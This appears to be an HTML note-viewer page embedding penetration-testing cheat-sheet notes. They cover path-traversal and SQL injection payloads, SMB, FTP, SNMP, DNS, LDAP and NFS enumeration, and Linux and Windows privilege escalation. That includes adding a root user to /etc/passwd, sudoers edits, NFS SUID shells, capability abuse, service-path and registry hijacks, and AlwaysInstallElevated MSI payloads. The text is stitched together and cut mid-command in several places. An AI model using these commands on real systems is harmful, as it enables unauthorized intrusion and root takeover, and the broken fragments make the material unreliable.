<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
<title>ognote</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:#0d1117;
  --sidebar:#161b22;
  --nav:#161b22;
  --border:#30363d;
  --text:#e6edf3;
  --muted:#8b949e;
  --accent:#58a6ff;
  --code-bg:#1c2128;
  --highlight:#ffe08a;
  --hl-bg:#3d3000;
  --active-bg:#1f2a3a;
}
html{scroll-behavior:smooth}
body{
  background:var(--bg);
  color:var(--text);
  font-family:'SF Mono',Consolas,'Liberation Mono',monospace;
  font-size:14px;
  line-height:1.6;
  display:flex;
  flex-direction:column;
  height:100vh;
  overflow:hidden;
}

/* NAV */
nav{
  background:var(--nav);
  border-bottom:1px solid var(--border);
  display:flex;
  align-items:center;
  padding:0 16px;
  height:48px;
  gap:16px;
  flex-shrink:0;
  z-index:100;
}
.logo{
  font-size:16px;
  font-weight:700;
  color:var(--accent);
  letter-spacing:1px;
  white-space:nowrap;
}
.search-wrap{
  flex:1;
  max-width:480px;
  position:relative;
}
.search-wrap input{
  width:100%;
  background:var(--bg);
  border:1px solid var(--border);
  border-radius:6px;
  color:var(--text);
  padding:6px 12px 6px 32px;
  font-size:13px;
  outline:none;
  font-family:inherit;
}
.search-wrap input:focus{border-color:var(--accent)}
.search-icon{
  position:absolute;
  left:9px;top:50%;transform:translateY(-50%);
  color:var(--muted);font-size:13px;
}
.search-count{
  font-size:12px;color:var(--muted);white-space:nowrap;
}
.search-nav{display:flex;gap:4px;align-items:center}
.search-nav button{
  background:var(--code-bg);border:1px solid var(--border);
  color:var(--text);border-radius:4px;padding:3px 8px;
  cursor:pointer;font-size:12px;
}
.search-nav button:hover{border-color:var(--accent);color:var(--accent)}

/* LAYOUT */
.layout{display:flex;flex:1;overflow:hidden}

/* SIDEBAR */
aside{
  width:260px;
  min-width:260px;
  background:var(--sidebar);
  border-right:1px solid var(--border);
  overflow-y:auto;
  padding:8px 0;
}
aside::-webkit-scrollbar{width:4px}
aside::-webkit-scrollbar-track{background:transparent}
aside::-webkit-scrollbar-thumb{background:var(--border);border-radius:2px}
.toc-item{
  display:block;
  padding:3px 12px;
  color:var(--muted);
  text-decoration:none;
  font-size:12px;
  line-height:1.5;
  border-left:2px solid transparent;
  transition:all .15s;
  white-space:nowrap;overflow:hidden;text-overflow:ellipsis;
}
.toc-item:hover{color:var(--text);background:var(--active-bg)}
.toc-item.active{color:var(--accent);border-left-color:var(--accent);background:var(--active-bg)}
.toc-item.l1{font-size:13px;font-weight:600;color:var(--text);padding-top:10px;padding-left:12px}
.toc-item.l2{padding-left:20px}
.toc-item.l3{padding-left:32px}
.toc-item.l4{padding-left:44px}

/* MAIN */
main{
  flex:1;
  overflow-y:auto;
  padding:32px 48px;
}
main::-webkit-scrollbar{width:6px}
main::-webkit-scrollbar-track{background:transparent}
main::-webkit-scrollbar-thumb{background:var(--border);border-radius:3px}

.content h1{
  font-size:22px;font-weight:700;
  color:var(--accent);
  margin:40px 0 16px;
  padding-bottom:8px;
  border-bottom:1px solid var(--border);
}
.content h2{
  font-size:17px;font-weight:600;
  color:#79c0ff;
  margin:28px 0 12px;
}
.content h3{
  font-size:15px;font-weight:600;
  color:#d2a8ff;
  margin:20px 0 8px;
}
.content h4{
  font-size:13px;font-weight:600;
  color:#ffa657;
  margin:16px 0 6px;
}
.content p{margin:8px 0;color:var(--text)}
.content a{color:var(--accent);text-decoration:none}
.content a:hover{text-decoration:underline}
.content ul,.content ol{margin:8px 0 8px 20px}
.content li{margin:3px 0}
.content pre{
  background:var(--code-bg);
  border:1px solid var(--border);
  border-radius:6px;
  padding:14px 16px;
  overflow-x:auto;
  margin:10px 0;
  font-size:12.5px;
  line-height:1.55;
}
.content pre::-webkit-scrollbar{height:4px}
.content pre::-webkit-scrollbar-thumb{background:var(--border)}
.content code{
  background:var(--code-bg);
  border-radius:3px;
  padding:1px 5px;
  font-size:12.5px;
  font-family:inherit;
  color:#ff7b72;
}
.content pre code{
  background:none;padding:0;color:var(--text);
}
.content table{
  border-collapse:collapse;
  margin:10px 0;width:100%;font-size:13px;
}
.content th,.content td{
  border:1px solid var(--border);
  padding:6px 10px;text-align:left;
}
.content th{background:var(--code-bg);color:var(--accent)}
.content strong{color:#ffa657}
.content em{color:#d2a8ff}
.content blockquote{
  border-left:3px solid var(--accent);
  padding:6px 12px;
  color:var(--muted);
  margin:8px 0;
  background:var(--code-bg);
  border-radius:0 4px 4px 0;
}
.content hr{border:none;border-top:1px solid var(--border);margin:20px 0}

/* HIGHLIGHT */
mark.hl{
  background:var(--hl-bg);
  color:var(--highlight);
  border-radius:2px;
  padding:0 1px;
}

/* No results */
.no-results{
  display:none;
  color:var(--muted);
  text-align:center;
  padding:40px;
  font-size:14px;
}
</style>
</head>
<body>

<nav>
  <span class="logo">ognote</span>
  <div class="search-wrap">
    <span class="search-icon">⌕</span>
    <input type="text" id="searchInput" placeholder="Search notes..." autocomplete="off"/>
  </div>
  <span class="search-count" id="searchCount"></span>
  <div class="search-nav">
    <button onclick="navSearch(-1)" title="Previous">↑</button>
    <button onclick="navSearch(1)" title="Next">↓</button>
    <button onclick="clearSearch()" title="Clear">✕</button>
  </div>
</nav>

<div class="layout">
  <aside id="sidebar"></aside>
  <main id="main">
    <div class="content" id="content"></div>
    <div class="no-results" id="noResults">No results found.</div>
  </main>
</div>

./../../../etc/passwd\n# - SQLi: &#39; OR &#39;1&#39;=&#39;1\n</code></pre>\n<h3>1.3 SMB Enumeration (Port 139/445)</h3>\n<pre><code class=\"language-bash\"># List shares\nsmbclient -L //&lt;target&gt; -N\nsmbmap -H &lt;target&gt; -u anonymous\n\n# Connect to share\nsmbclient //&lt;target&gt;/&lt;share&gt; -N\n\n# Enum4linux (Comprehensive)\nenum4linux -a &lt;target&gt;\n\n# Null session check\nrpcclient -U &quot;&quot; -N &lt;target&gt;\n&gt; srvinfo\n&gt; enumdomusers\n&gt; enumalsgroups builtin\n\n# CrackMapExec\ncrackmapexec smb &lt;target&gt; --shares\ncrackmapexec smb &lt;target&gt; -u &#39;&#39; -p &#39;&#39; --shares\n</code></pre>\n<h3>1.4 FTP Enumeration (Port 21)</h3>\n<pre><code class=\"language-bash\"># Anonymous login\nftp &lt;target&gt;\nName: anonymous\nPassword: [blank or anything]\n\n# Nmap scripts\nnmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 -p 21 &lt;target&gt;\n</code></pre>\n<h3>1.5 SNMP Enumeration (Port 161/UDP)</h3>\n<pre><code class=\"language-bash\"># Brute force community strings\nonesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt &lt;target&gt;\n\n# Walk the MIB tree\nsnmpwalk -v 2c -c public &lt;target&gt;\nsnmp-check &lt;target&gt; -c public\n</code></pre>\n<h3>1.6 DNS Enumeration (Port 53)</h3>\n<pre><code class=\"language-bash\"># Zone transfer attempt\ndig axfr @&lt;target&gt; &lt;domain&gt;\n\n# DNSRecon\ndnsrecon -d &lt;domain&gt; -t axfr\n</code></pre>\n<h3>1.7 LDAP Enumeration (Port 389/636/3268/3269)</h3>\n<pre><code class=\"language-bash\"># Anonymous bind check\nldapsearch -x -H ldap://&lt;target&gt; -b &quot;dc=domain,dc=com&quot;\n</code></pre>\n<h3>1.8 NFS Enumeration (Port 2049)</h3>\n<pre><code class=\"language-bash\"># Show exports\nshowmount -e &lt;target&gt;\n\n# Mount share\nmkdir /mnt/nfs\nmount -t nfs &lt;target&gt;:/path /mnt/nfs\n</code></pre>\n<h3>1.9 RPC Enumeration (Port 111/135)</h3>\n<pre><code class=\"language- de class=\"language-bash\">ls -la /etc/passwd\nls -la /etc/shadow\nls -la /etc/sudoers\nls -la /etc/crontab\nls -la /etc/hosts\n</code></pre>\n<h3>Writable /etc/passwd</h3>\n<pre><code class=\"language-bash\"># Generate password hash\nopenssl passwd -1 -salt xyz password123\n# Add new root user\necho &#39;hacker:$1$xyz$HASH:0:0:root:/root:/bin/bash&#39; &gt;&gt; /etc/passwd\nsu hacker   # password: password123\n</code></pre>\n<h3>Writable /etc/sudoers</h3>\n<pre><code class=\"language-bash\">echo &quot;$(whoami) ALL=(ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers\nsudo bash\n</code></pre>\n<hr>\n<h2>6. NFS Misconfigurations</h2>\n<h3>Check NFS Exports (from target)</h3>\n<pre><code class=\"language-bash\">cat /etc/exports\nshowmount -e MACHINE_IP          # From attacker\n</code></pre>\n<h3>Exploit no_root_squash</h3>\n<pre><code class=\"language-bash\"># If /etc/exports shows: /share *(rw,no_root_squash)\n# From attacker machine (as root):\nmkdir /tmp/nfs\nmount -o rw,vers=2 MACHINE_IP:/share /tmp/nfs\ncp /bin/bash /tmp/nfs/rootbash\nchmod +s /tmp/nfs/rootbash\n# Back on target:\n/share/rootbash -p    # → root shell\n</code></pre>\n<hr>\n<h2>7. Capabilities</h2>\n<blockquote>\n<p>Linux capabilities give partial root powers without full SUID.</p>\n</blockquote>\n<h3>Find Binaries with Capabilities</h3>\n<pre><code class=\"language-bash\">getcap -r / 2&gt;/dev/null\n</code></pre>\n<h3>Common Exploitable Capabilities</h3>\n<table>\n<thead>\n<tr>\n<th>Capability</th>\n<th>Binary</th>\n<th>Exploit</th>\n</tr>\n</thead>\n<tbody><tr>\n<td><code>cap_setuid+ep</code></td>\n<td>python3</td>\n<td><code>python3 -c &#39;import os; os.setuid(0); os.system(&quot;/bin/bash&quot;)&#39;</code></td>\n</tr>\n<tr>\n<td><code>cap_setuid+ep</code></td>\n<td>perl</td>\n<td><code>perl -e &#39;use POSIX qw(setuid); setuid(0); exec &quot;/bin/bash&quot;;&#39;</code></td>\n</tr>\n<tr>\n<td><code>cap_net_raw</code></td>\n<td>tcpdump</td>\n<td>Sniff passwords from network</td>\n</tr>\n<tr>\n<td> n<pre><code class=\"language-cmd\">wmic service get name,displayname,pathname,startmode | findstr /i &quot;auto&quot; | findstr /iv &quot;c:\\windows\\\\&quot; | findstr /iv &quot;&quot;&quot;\n\n# PowerShell:\nGet-WmiObject Win32_Service | Select Name, PathName | Where-Object {$_.PathName -notlike &#39;&quot;*&#39; -and $_.PathName -notlike &#39;C:\\Windows*&#39;}\n</code></pre>\n<h3>Exploit Unquoted Service Path</h3>\n<pre><code># Service path: C:\\Program Files\\My App\\service.exe\n# Windows tries:\n# C:\\Program.exe\n# C:\\Program Files\\My.exe\n# C:\\Program Files\\My App\\service.exe\n\n# Place malicious binary at first writable location:\ncopy shell.exe &quot;C:\\Program Files\\My.exe&quot;\nsc stop MyService &amp;&amp; sc start MyService\n</code></pre>\n<hr>\n<h2>4. Registry Exploits</h2>\n<h3>AutoRun Registry Keys</h3>\n<pre><code class=\"language-cmd\">reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nreg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\n</code></pre>\n<h3>Check Write Permissions on Registry Keys</h3>\n<pre><code class=\"language-cmd\">accesschk.exe /accepteula -uvwqk HKLM\\System\\CurrentControlSet\\Services\\VULNSVC\n# If writable:\nreg add HKLM\\System\\CurrentControlSet\\Services\\VULNSVC /v ImagePath /t REG_EXPAND_SZ /d &quot;C:\\temp\\shell.exe&quot; /f\n</code></pre>\n<h3>Registry Always Install Elevated (See Section 5)</h3>\n<hr>\n<h2>5. AlwaysInstallElevated</h2>\n<blockquote>\n<p>If both HKLM and HKCU keys are set to 1, any user can install MSI as SYSTEM.</p>\n</blockquote>\n<h3>Check</h3>\n<pre><code class=\"language-cmd\">reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\nreg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated\n</code></pre>\n<h3>Exploit</h3>\n<pre><code class=\"language-cmd\"># Create malicious MSI (on attacker):\nmsfvenom -p windows/x // Add IDs to headings based on text
function slugify(text) {
  return text.toLowerCase()
    .replace(/[*_`]/g,'')
    .replace(/[^\w\s-]/g,'')
    .replace(/[\s_]+/g,'-')
    .replace(/^-+|-+$/g,'');
}

contentEl.querySelectorAll('h1,h2,h3,h4').forEach(h => {
  if(!h.id) {
    h.id = slugify(h.textContent);
  }
});

// Scroll spy

const tocLinks = document.querySelectorAll('.toc-item');

mainEl.addEventListener('scroll', () => {

  contentEl.querySelectorAll('h1,h2,h3,h4').forEach(h => {
    if(h.offsetTop <= mainEl.scrollTop + 80) current = h.id;
  });

    a.classList.toggle('active', a.dataset.anchor === current);

});

// === SEARCH ===
let matches = [];
let currentMatch = -1;
const searchInput = document.getElementById('searchInput');
const searchCount = document.getElementById('searchCount');
const noResults = document.getElementById('noResults');

function clearSearch() {
  searchInput.value = '';
  doSearch('');
  searchInput.focus();
}

function doSearch(query) {
  // Reset content
  contentEl.innerHTML = RAW_HTML;
  contentEl.querySelectorAll('h1,h2,h3,h4').forEach(h => {
    if(!h.id) h.id = slugify(h.textContent);
  });
  matches = [];
  currentMatch = -1;

  if(!query || query.trim().length < 2) {
    searchCount.textContent = '';
    noResults.style.display = 'none';
    return;
  }

  const q = query.trim();
  const regex = new RegExp('(' + q.replace(/[.*+?^${}()|[\]\\]/g, '\\$&') + ')', 'gi');

  // Walk text nodes and highlight
  function walk(node) {
    if(node.nodeType === 3) {
      if(regex.test(node.nodeValue)) {
        const span = document.createElement('span');
        span.innerHTML = node.nodeValue.replace(regex, '<mark class="hl">$1</mark>');
        node.parentNode.replaceChild(span, node);
      }
    } else if(node.nodeType === 1 && !['SCRIPT','STYLE'].includes(node.tagName)) {
      Array.from(node.childNodes).forEach(walk);
    }
  }
  walk(contentEl);

  matches = Array.from(contentEl.querySelectorAll('mark.hl'));

  if(matches.length === 0) {
    searchCount.textContent = 'No results';
    noResults.style.display = 'block';
  } else {
    noResults.style.display = 'none';
    currentMatch = 0;
    scrollToMatch(0);
    updateCount();
  }
}

function scrollToMatch(idx) {
  matches.forEach((m,i) => m.style.outline = i===idx ? '2px solid #ffe08a' : 'none');
  if(matches[idx]) {
    matches[idx].scrollIntoView({behavior:'smooth', block:'center'});
  }
}

function updateCount() {
  if(matches.length === 0) return;
  searchCount.textContent = (currentMatch+1) + ' / ' + matches.length;
}

function navSearch(dir) {
  if(matches.length === 0) return;
  currentMatch = (currentMatch + dir + matches.length) % matches.length;
  scrollToMatch(currentMatch);
  updateCount();
}

let debounce;
searchInput.addEventListener('input', () => {
  clearTimeout(debounce);
  debounce = setTimeout(() => doSearch(searchInput.value), 200);
});

searchInput.addEventListener('keydown', e => {
  if(e.key === 'Enter') navSearch(e.shiftKey ? -1 : 1);
  if(e.key === 'Escape') clearSearch();
});
